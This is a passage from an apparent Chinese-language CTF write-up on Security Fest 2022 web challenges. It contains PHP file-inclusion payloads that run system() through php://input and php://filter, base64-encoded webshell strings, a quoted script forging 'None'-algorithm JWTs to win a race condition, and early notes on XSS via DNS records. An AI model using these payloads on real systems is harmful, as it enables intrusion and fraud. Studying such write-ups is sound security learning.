class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> &#125; ?&gt;</span></span><br><span class="line"><span class="class">1</span></span><br></pre></td></tr></table></figure><p>先理一理这题啥意思</p><blockquote><p>PHP <code>ini_set</code>用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </p></blockquote><p>限制死了文件包含。。。 但是限制了 <code>open_basedir</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_fopen&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/var/www&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后把每个请求都用 这玩意过滤了一下  意思就是把<strong>四种</strong>请求头给过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nohack</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/(\.\.+|^\/|^(file|http|https|ftp):)/i&quot;</span>, <span class="string">&quot;XXX&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是有个请求文件的路由  一个查看 一个上传 GET 和 POST</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">set_include_path</span>(<span class="string">&quot;/var/www/messages&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Message contents: &lt;br&gt;\n&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是POST 但是后面有点奇怪 包含了一堆 html 进去 不知道有没有什么操作空间</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too big file&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="comment">// 文件不能太长</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">1337</span>).<span class="string">&quot;.msg&quot;</span>;  <span class="comment">// 上传以后重命名</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/var/www/messages/&quot;</span>.<span class="variable">$filename</span>, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;?php var_dump(&quot;</span>.<span class="title function_ invoke__">var_export</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>], <span class="literal">true</span>).<span class="string">&quot;)?&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?file=&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br></pre></td></tr></table></figure><p>然后接了这么一句话 不知道有什么深意</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* nothing chall related here, I hope */</span></span><br></pre></td></tr></table></figure><p>在<code>php</code>中间加了一堆html元素？？？</p><p>猜测一波 这点与绕过<code>open_basedir</code> 有关?</p><p>来仔细看一下这个上传文件的操作</p><p>然后我们就是要绕过 <code>nohack</code> 但是 emmm</p><p>为啥传什么进去都是string啊  草  怎么搞</p><p>因为他这里最后是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>突然想到 他不允许我远程包含 但是我可以本地包含呀</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+</span><br></pre></td></tr></table></figure><p>我们能不能把这个base64给写到本地去。然后再请求 include 去包含它</p><p>直接由 <code>input://</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dumperignon-01.hackaplaneten.se</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dumperignon-01.hackaplaneten.se/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"></span><br><span class="line"><span class="language-php">a=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;./flag_dispenser&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>**<code>php://</code>****在<code>allow_url_fopen</code>，<code>allow_url_include</code>都关闭的情况下可以正常使用</p><p>看了看maple大哥的wp （比我的麻烦 嘻嘻</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxPD9waHAgc3lzdGVtKCRfR0VUWzBdKTsvL3R4</span><br><span class="line">http:<span class="regexp">//</span>dumperignon-<span class="number">01</span>.hackaplaneten.se<span class="regexp">/?file=php:/</span><span class="regexp">/filter/</span>convert.base64-decode<span class="regexp">/resource=/</span>var<span class="regexp">/www/m</span>essages<span class="regexp">/e8c2ef8ec46207240b47fd7905b70ede842.msg&amp;0=./</span>flag_dispenser</span><br></pre></td></tr></table></figure><h3 id="nofkntax-all-web-is-guess"><a href="#nofkntax-all-web-is-guess" class="headerlink" title="nofkntax(all,web,is,guess?)"></a>nofkntax(all,web,is,guess?)</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://nofkntax.pwn.so:45246/</span><br><span class="line">Tax or haxx? Choose your destiny. Please note: the database is reset once an hour.</span><br></pre></td></tr></table></figure></blockquote><p>guess?</p><p>那我们就来guess guess</p><p>要买flag</p><p>要很多前</p><p>估计要搞数据库</p><p>那应该要注入</p><p>有个tip</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/account/tip</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>nofkntax.pwn.so:45246</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>167</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://nofkntax.pwn.so:45246</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://nofkntax.pwn.so:45246/account</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>acct=ba814cf1894723fbf12ba2546352a4b784dbb613</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">amount</span>=<span class="number">1</span>&amp;dest=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZGRyZXNzIjoiMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMCJ9.k6JoCG270Us_AO9vE0JWgi6M2PZMZ8whQZSdUbGNftk</span></span><br></pre></td></tr></table></figure><p>Cookie: acct=ba814cf1894723fbf12ba2546352a4b784dbb613</p><p>咋感觉这个cookie一直都没变。。。</p><p><img src="/2022/06/02/Security-Fest-2022/image-20220603162315060.png" alt="image-20220603162315060"></p><p>购买成功的cookie</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: acct=<span class="number">1</span>e<span class="number">4</span>d<span class="number">366</span>d<span class="number">7351275407</span>c<span class="number">50</span>d<span class="number">67666</span>e<span class="number">4715</span>d<span class="number">18</span>a<span class="number">0897</span>; msg=Q<span class="number">29</span>uZ<span class="number">3</span>JhdH<span class="attr">VsYXRpb25</span>zLCB<span class="number">5</span>b<span class="number">3</span>Uga<span class="symbol">nVzdCBib3</span>V<span class="symbol">naHQgYSB0</span>aGluZyE<span class="meta">%</span><span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>Congratulations, you just bought a thing!</p><p>在这个数的时候还可以发 1000000000000000000</p><p>但是多一个0都不行 </p><p>other’s sol</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_jwt</span>(<span class="params">acct</span>):</span><br><span class="line"></span><br><span class="line">    jwt_prefix = <span class="string">&quot;eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0&quot;</span></span><br><span class="line">    jwt_payload = base64.standard_b64encode(json.dumps(&#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: acct,</span><br><span class="line">    &#125;).encode()).decode().replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jwt_prefix + <span class="string">&quot;.&quot;</span> + jwt_payload + <span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">sess_a = requests.session()</span><br><span class="line">sess_a.headers.update(&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;A&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">sess_b = requests.session()</span><br><span class="line">sess_b.headers.update(&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;B&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">resp = sess_a.get(<span class="string">&quot;http://nofkntax.pwn.so:45246/account&quot;</span>, )</span><br><span class="line">resp = sess_b.get(<span class="string">&quot;http://nofkntax.pwn.so:45246/account&quot;</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jwt_a = get_jwt(sess_a.cookies[<span class="string">&#x27;acct&#x27;</span>])</span><br><span class="line">jwt_b = get_jwt(sess_b.cookies[<span class="string">&#x27;acct&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s = sess_a</span><br><span class="line">        tip_jwt = jwt_b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = sess_b</span><br><span class="line">        tip_jwt = jwt_a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">curl --request POST \</span></span><br><span class="line"><span class="string">  --url http://nofkntax.pwn.so:45246/account/tip \</span></span><br><span class="line"><span class="string">  --header &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \</span></span><br><span class="line"><span class="string">  --header &#x27;User-Agent: <span class="subst">&#123;s.headers[<span class="string">&#x27;User-Agent&#x27;</span>]&#125;</span>&#x27; \</span></span><br><span class="line"><span class="string">  --data amount=<span class="subst">&#123;<span class="number">2</span>**i&#125;</span> \</span></span><br><span class="line"><span class="string">  --data dest=<span class="subst">&#123;tip_jwt&#125;</span> &amp;</span></span><br><span class="line"><span class="string">curl --request POST \</span></span><br><span class="line"><span class="string">  --url http://nofkntax.pwn.so:45246/account/tip \</span></span><br><span class="line"><span class="string">  --header &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \</span></span><br><span class="line"><span class="string">  --header &#x27;User-Agent: <span class="subst">&#123;s.headers[<span class="string">&#x27;User-Agent&#x27;</span>]&#125;</span>&#x27; \</span></span><br><span class="line"><span class="string">  --data amount=<span class="subst">&#123;<span class="number">2</span>**i&#125;</span> \</span></span><br><span class="line"><span class="string">  --data dest=<span class="subst">&#123;tip_jwt&#125;</span> &amp;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(resp.status_code)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">GET /account</span></span><br><span class="line"><span class="string">    &lt;li&gt;</span></span><br><span class="line"><span class="string">        &lt;span class=&quot;item&quot;&gt;&lt;img src=&quot;/assets/img/items/4.gif&quot; alt=&quot;SECFEST&#123;7h1s_NFT_stUfF_1s_4_r4T_r4C3&#125;&quot; width=&quot;70&quot; height=&quot;70&quot; /&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;SECFEST&#123;7h1s_NFT_stUfF_1s_4_r4T_r4C3&#125;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;&lt;strong class=&quot;small-price&quot;&gt;₳65536.00&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/li&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Madness"><a href="#Madness" class="headerlink" title="Madness"></a>Madness</h3><p>所以这题的flag在哪。草</p><p>没看懂哇</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, make_response, render_template, request, redirect</span><br><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">from</span> werkzeug.urls <span class="keyword">import</span> url_fix</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">app = Flask(__name__, static_url_path=<span class="string">&quot;/app/static&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> path == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/app&quot;</span>, code=<span class="number">301</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, prefix=<span class="string">&quot;/&quot;</span>+request.path.lstrip(<span class="string">&quot;/&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app/api/lookup/&lt;string:domain&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lookup</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&quot;^[a-z.-]+$&quot;</span>, domain):</span><br><span class="line">        my_resolver = dns.resolver.Resolver()</span><br><span class="line">        my_resolver.nameservers = [<span class="string">&#x27;1.1.1.1&#x27;</span>]</span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> my_resolver.query(domain, <span class="string">&#x27;A&#x27;</span>):</span><br><span class="line">                out.append(<span class="built_in">str</span>(item))</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;OK&quot;</span>, <span class="string">&quot;result&quot;</span>:out&#125;))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e = <span class="string">&quot;invalid domain (^[a-z.-]+) &#123;&#125;&quot;</span>.<span class="built_in">format</span>(domain)</span><br><span class="line">        <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&#x27;X-Frame-Options&#x27;</span>] = <span class="string">&#x27;DENY&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;X-Content-Type-Options&#x27;</span>] = <span class="string">&#x27;nosniff&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;default-src &#x27;self&#x27; cloudflare-dns.com; img-src *&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><img src="/2022/06/02/Security-Fest-2022/image-20220603001238754.png" alt="image-20220603001238754" style="zoom: 50%;"><p>奇怪的xss</p><p>csp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response.headers[<span class="string">&#x27;X-Frame-Options&#x27;</span>] = <span class="string">&#x27;DENY&#x27;</span></span><br><span class="line">response.headers[<span class="string">&#x27;X-Content-Type-Options&#x27;</span>] = <span class="string">&#x27;nosniff&#x27;</span></span><br><span class="line">response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;default-src &#x27;self&#x27; cloudflare-dns.com; img-src *&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/02/Security-Fest-2022/image-20220603004126183.png" alt="image-20220603004126183"></p><p>看一下 这个 <code>cloudflare-dns.com</code> 啥意思</p><img src="/2022/06/02/Security-Fest-2022/image-20220603001837561.png" alt="image-20220603001837561" style="zoom:67%;"><p>想要整xss 不知道这个<code> href</code> 有没有什么用</p><p>这个path 其实是没有被过滤的</p><p>我们可以控制这个路径</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;/fuckyou/2333/static/style.css&quot;</span>&gt;&lt;/link&gt;</span><br><span class="line">&lt;script <span class="attribute">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attribute">src</span>=<span class="string">&quot;/fuckyou/2333/static/dns.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>先看一下这个<code>lookup</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app/api/lookup/&lt;string:domain&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lookup</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&quot;^[a-z.-]+$&quot;</span>, domain):</span><br><span class="line">        my_resolver = dns.resolver.Resolver()</span><br><span class="line">        my_resolver.nameservers = [<span class="string">&#x27;1.1.1.1&#x27;</span>]</span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> my_resolver.query(domain, <span class="string">&#x27;A&#x27;</span>):</span><br><span class="line">                out.append(<span class="built_in">str</span>(item))</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;OK&quot;</span>, <span class="string">&quot;result&quot;</span>:out&#125;))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e = <span class="string">&quot;invalid domain (^[a-z.-]+) &#123;&#125;&quot;</span>.<span class="built_in">format</span>(domain)</span><br><span class="line">        <span class="keyword">return</span> make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;result&quot;</span>:<span class="built_in">str</span>(e)&#125;))</span><br></pre></td></tr></table></figure><p>我们可能要学习一下 xss via dns</p><p><a href="https://medium.com/tenable-techblog/cross-site-scripting-via-whois-and-dns-records-a25c33667fff">https://medium.com/tenable-techblog/cross-site-scripting-via-whois-and-dns-records-a25c33667fff</a></p><p><a href="https://blog.apnic.net/2022/02/22/resurrection-of-injection-attacks/">https://blog.apnic.net/2022/02/22/resurrection-of-injection-attacks/</a></p><img src="/2022/06/02/Security-Fest-2022/image-20220603150802759.png" alt="image-20220603150802759" 